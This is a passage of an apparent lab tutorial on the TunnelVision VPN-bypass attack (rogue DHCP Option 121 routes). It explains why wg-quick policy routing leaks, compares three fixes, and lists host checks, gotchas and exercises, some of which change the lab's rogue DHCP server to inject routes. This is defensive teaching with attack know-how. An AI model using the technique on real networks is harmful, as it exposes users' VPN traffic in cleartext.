+Scenario 4 removes the `/1` routes and installs `wg-quick`'s policy routing instead. It takes no new lease: the four rogue `/2` routes from Scenario 3 are still in `main`. The two rules, as `ip rule show` prints them:
+
+```text
+32764:  from all lookup main suppress_prefixlength 0
+32765:  not from all fwmark 0xca6c lookup 51820
+```
+
+When Option 121 installs the four `/2` routes into table `main`, rule `32764` matches because the `/2` routes have prefix length 2, which exceeds 0. The `suppress_prefixlength 0` directive only suppresses the `/0` default route. Consequently, rule `32765` is never evaluated for normal traffic, and all application traffic egresses via `eth0` in cleartext.
+
+### Section 5: Fix A, no suppress_prefixlength rule
+
+In Scenario 5, rule `32764` (`suppress_prefixlength 0`) is removed. All unmarked traffic evaluates rule `32765` directly, which forces lookups into table `51820` (the VPN table). 
+
+Probes to `203.0.113.10` and `198.51.100.7` successfully traverse `vpn0`. However, Fix A introduces a side effect regarding local network access:
+1. Tunnel packets originating from the local VPN process carry mark `0xca6c` (`51820`), skipping rule `32765` and looking up table `main` to reach the VPN server IP (`192.0.2.1`).
+2. Unmarked traffic destined for a legitimate local network resource (such as a LAN printer at `192.168.50.20`) matches rule `32765` and is forcibly routed into table `51820`. If the remote VPN does not route the local subnet, access to local resources fails. 
+3. Furthermore, because tunnel packets carrying mark `0xca6c` evaluate table `main`, an attacker injecting specific routes for the VPN server's remote IP address can still redirect or blackhole the encrypted tunnel traffic itself (resulting in a denial-of-service), though they cannot decrypt payload contents.
+
+### Section 6: Fix B, the client ignores Option 121
+
+Scenario 6 restores standard `wg-quick` FIB rules but executes the DHCP client with `--ignore-121`. The client processes Option 3 and installs only a single default route (`0.0.0.0/0`) in table `main`. 
+
+Rule `32764` (`suppress_prefixlength 0`) matches the `/0` route in `main` and suppresses it. Evaluation proceeds to rule `32765`, which routes all application traffic safely into table `51820` and out `vpn0`.
+
+### Section 7: Fix C, namespace isolation
+
+In Scenario 7, the physical interface `eth0` is moved into a dedicated network namespace named `phys`. The application namespace `client` retains only `vpn0` and loopback.
+
+The physical routing table inside `phys` receives the four rogue `/2` routes via DHCP, but these entries exist strictly within the `phys` namespace kernel state. The `client` routing table contains only the default route pointing to `vpn0`. All application traffic is structurally restricted to `vpn0`. In the lab `vpn0` is a veth to the `vpn` namespace; with real WireGuard the encrypted UDP socket stays in `phys`, so the rogue routes can at most redirect or drop ciphertext.
+
+## Checking a real host
+
+On a laptop or VPN client, three commands show whether DHCP has put routes where the tunnel cannot win:
+
+1. Inspect active IPv4 routing tables for unexpected static routes installed by DHCP:
+   ```bash
+   ip route show proto dhcp
+   ```
+2. Check whether specific destination lookups select the virtual tunnel interface or the physical adapter:
+   ```bash
+   ip route get 203.0.113.10
+   ip route get 1.1.1.1
+   ```
+3. Inspect system policy routing rules to ensure no `suppress_prefixlength` bypasses exist without proper namespace isolation:
+   ```bash
+   ip rule show
+   ```
+
+## Gotchas
+
+1. **RFC 3442 Mandatory Precedence Over Option 3**: Compliant DHCP clients MUST ignore Option 3 (Router) completely if Option 121 is present in the server payload. Server configurations that supply Option 121 without an embedded `0.0.0.0/0` route will leave non-VPN clients without any default gateway.
+2. **Interface Metric Ineffectiveness against Prefix Length**: Setting a high metric (such as `metric 1024`) on DHCP-injected Option 121 routes does not prevent them from taking precedence over VPN routes. Metrics are only evaluated when comparing routes with identical prefix lengths. A `/2` route with metric 1024 will always beat a `/1` or `/0` route with metric 0.
+3. **Kill Switch Blind Spots**: VPN kill switches that monitor virtual adapter operational state (`operstate`), tunnel socket status, or daemon process state will not trigger during a TunnelVision attack. The control plane remains connected and healthy while the data plane leaks via injected host routes in the primary namespace table.
+4. **Firewall Mitigation Limitations**: Blocking non-VPN traffic on the physical interface prevents cleartext data exposure, but allows an attacker to perform traffic analysis. By selectively advertising specific subnet routes via Option 121 and observing which client connections fail, an attacker can determine destination services accessed by the user.
+5. **Policy Routing suppress_prefixlength Edge Cases**: The `wg-quick` rule `suppress_prefixlength 0` strictly suppresses matches against prefix length 0. It does not suppress `/1`, `/2`, or finer subnets installed by local software or DHCP options in the `main` table.
+6. **IPv6 has the same shape**: a rogue Router Advertisement can carry RFC 4191 Route Information Options. Linux only installs RIOs up to `accept_ra_rt_info_max_plen` (functional default 0, so only `::/0`). Raising it on a laptop that uses a full-tunnel VPN reopens the leak for IPv6.
+7. **Local LAN Access vs. Security Tradeoffs**: Completely suppressing `main` table lookups for unmarked traffic prevents Option 121 leaks, but breaks local network resource discovery (e.g., local printers, NAS devices) unless explicit bypass rules are added to table `51820`.
+8. **Option 249 is the same attack**: clients that still honour Microsoft's private Option 249 (`ms_classless_static_routes` in dhcpcd) must ignore it too, or the attacker simply switches option numbers.
+9. **Ignoring 121 must be unconditional**: if the user can turn route acceptance back on when "the network does not work", the attacker only has to break connectivity until they do (Leviathan makes the same point).
+10. **The lab's VPN device is a veth**: real WireGuard or OpenVPN changes nothing about the route lookup, but it does add the encapsulation path. Re-run the scenarios on a lab host with `wg-quick` before trusting a specific client.
+
+## Exercises
+
+1. Modify `server.py` to encode eight `/3` static routes instead of four `/2` routes. Calculate the wire byte size of the Option 121 payload and verify using `lab.sh` that kernel longest-prefix matching still routes cleartext traffic out `eth0`.
+2. On a lab host with nftables, add a client policy that drops all outgoing packets on `eth0` whose destination is not the explicit VPN server IP (`192.0.2.1`). Test Scenario 3 and confirm that data leaks are prevented while observing the resulting denial-of-service behavior.
+3. Write a small checker that reads `/proc/sys/net/ipv6/conf/*/accept_ra_rt_info_max_plen` and `accept_ra` for every interface and warns when an interface accepts RAs with Route Information longer than `/0`. Run it on your laptop.
+4. Update `lab.sh` to test a split-tunnel VPN configuration where only `203.0.113.0/24` is intended to pass through `vpn0`. Inject a rogue `/25` route (`203.0.113.0/25`) via Option 121 and verify how partial traffic redirection occurs.
+5. Build an automated shell script using `ip netns` that establishes a WireGuard interface in an isolated physical namespace (`phys`), moves the device node into the default namespace, and executes a full-tunnel lease cycle while verifying zero route pollution in the application environment.
+
+## Verification
+
+- Ran on the build box as an unprivileged user (Linux 6.12, iproute2 6.15.0, Python 3.13 standard library), in `unshare -urnm` namespaces; nothing installed. Every listing above is the file that ran, and both output blocks are pasted verbatim from the runs on 2026-11-14 (IST). `lab.sh` was run twice and gave identical output.
+- `vectors.py` reproduces every row of the RFC 3442 example table.
+- The VPN is simulated: `vpn0` is a veth into a namespace, not a WireGuard or OpenVPN device (no `wg` tool, no root on the build box). The routing behaviour shown is the kernel's own; the encapsulation is not exercised.
+- Not run here: the systemd-networkd, NetworkManager and dhcpcd snippets, real `wg-quick`, and any firewall kill switch.
+
+## Sources
+
+- RFC 3442, The Classless Static Route Option for DHCPv4 (encoding table, Router option precedence, section 7): <https://www.rfc-editor.org/rfc/rfc3442>
+- RFC 2132, DHCP Options and BOOTP Vendor Extensions (Option 3, Option 33): <https://www.rfc-editor.org/rfc/rfc2132>
+- RFC 2131, Dynamic Host Configuration Protocol: <https://www.rfc-editor.org/rfc/rfc2131>
+- CVE-2024-3661 record: <https://www.cve.org/CVERecord?id=CVE-2024-3661>
+- Leviathan Security, "TunnelVision (CVE-2024-3661)" (2024-05-06): <https://www.leviathansecurity.com/blog/tunnelvision>
+- wg-quick for Linux, the `ip rule` setup in `add_default`: <https://git.zx2c4.com/wireguard-tools/tree/src/wg-quick/linux.bash>
+- WireGuard, Routing and Network Namespace Integration: <https://www.wireguard.com/netns/>
+- systemd.network(5), `[DHCPv4]` `UseRoutes=`, `UseGateway=`, `RouteTable=`: <https://www.freedesktop.org/software/systemd/man/latest/systemd.network.html>
+- NetworkManager settings, `ipv4.ignore-auto-routes`: <https://networkmanager.dev/docs/api/latest/nm-settings-nmcli.html>
+- dhcpcd option definitions (121 `classless_static_routes`, 249 `ms_classless_static_routes`): <https://github.com/NetworkConfiguration/dhcpcd/blob/master/src/dhcpcd-definitions.conf>
+- RFC 4191, Default Router Preferences and More-Specific Routes: <https://www.rfc-editor.org/rfc/rfc4191>
+- Linux ip-sysctl documentation (`accept_ra_rt_info_max_plen`): <https://docs.kernel.org/networking/ip-sysctl.html>
+- Xue et al., "Bypassing Tunnels: Leaking VPN Client Traffic by Abusing Routing Tables" (TunnelCrack), USENIX Security 2023: <https://www.usenix.org/conference/usenixsecurity23/presentation/xue>
